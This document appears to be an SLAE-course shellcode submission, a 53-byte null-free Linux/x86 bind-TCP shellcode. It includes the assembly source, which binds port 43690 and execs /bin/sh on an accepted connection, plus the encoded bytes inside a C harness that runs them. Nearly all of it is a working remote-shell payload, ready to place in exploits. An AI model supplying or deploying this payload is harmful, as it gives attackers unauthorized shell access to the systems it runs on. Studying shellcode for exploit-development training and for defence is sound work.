#---------------------- DESCRIPTION -------------------------------------#

; Title: Linux/x86 bind tcp shellcode (port 43690) null-free
; Author: Daniel Ortiz
; Tested on: Linux 4.18.0-25-generic #26 Ubuntu
; Size: 53 bytes
; SLAE ID: PA-9844



section .DATA

section .BSS


section .TEXT

global _start

  _start:

  ; int socket(int domain, int type, int protocol);

  xor eax, eax
  xor ebx, ebx
  cdq

  push eax              ; protocol - 0
  push byte 0x1         ; type - SOCK_STREAM
  push byte 0x2         ; dominio - AF_INET

  mov ecx, esp
  inc bl                ; sys_socket
  mov al, 102           ; socketcall system call
  int 0x80

  mov esi, eax ; save the socketfd

  ; bind(soc, (struct sockaddr *)&srv_addr, 0x10)


  push edx
  push word 0xAAAA
  push word 2
  mov ecx, esp
  push byte 0x10        ; last argument
  push ecx              ; pointer to the structure
  push esi              ; socketfd
  mov ecx, esp
  inc bl                ; bl contains 2
  mov al, 102
  int 0x80


  ; int listen(int sockfd, int backlog);

  push edx
  push esi
  mov ecx, esp
  mov bl, 0x4         ; bl contains 4
  mov al, 102
  int 0x80

  ; int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen)

  push edx
  push edx
  push esi            ; socketfd
  mov ecx, esp
  inc bl              ; bl contains 5
  mov al, 102
  int 0x80
  mov ebx, eax

  ; int dup2(int oldfd, int newfd, int flags);

  xor ecx, ecx
  mov cl, 3
  l00p:
    dec cl
    mov al, 63
    int 0x80
    jnz l00p


  ; int execve(const char *filename, char *const argv[],char *const envp[])

  push edx
  push long 0x68732f2f
  push long 0x6e69622f
  mov ebx, esp
  push edx
  push edx
  mov ecx, esp
  mov al, 0x0b
  int 0x80


  ; exit syscall
  xor eax, eax
  mov al, 0x1
  mov bl, 0x8
  int 0x80

/*

shellcode.c program

*/

#include<stdio.h>
#include<string.h>

unsigned char code[] = \

"\x31\xc0\x31\xdb\x99\x50\x6a\x01\x6a\x02\x89\xe1\xfe\xc3\xb0\x66"
"\xcd\x80\x89\xc6\x52\x66\x68\xaa\xaa\x66\x6a\x02\x89\xe1\x6a\x10"
"\x51\x56\x89\xe1\xfe\xc3\xb0\x66\xcd\x80\x52\x56\x89\xe1\xb3\x04"
"\xb0\x66\xcd\x80\x52\x52\x56\x89\xe1\xfe\xc3\xb0\x66\xcd\x80\x89"
"\xc3\x31\xc9\xb1\x03\xfe\xc9\xb0\x3f\xcd\x80\x75\xf8\x52\x68\x2f"
"\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x52\x89\xe1\xb0\x0b"
"\xcd\x80\x31\xc0\xb0\x01\xb3\x08\xcd\x80";


main()
{

        printf("Shellcode Length:  %d\n", strlen(code));

        int (*ret)() = (int(*)())code;

        ret();

}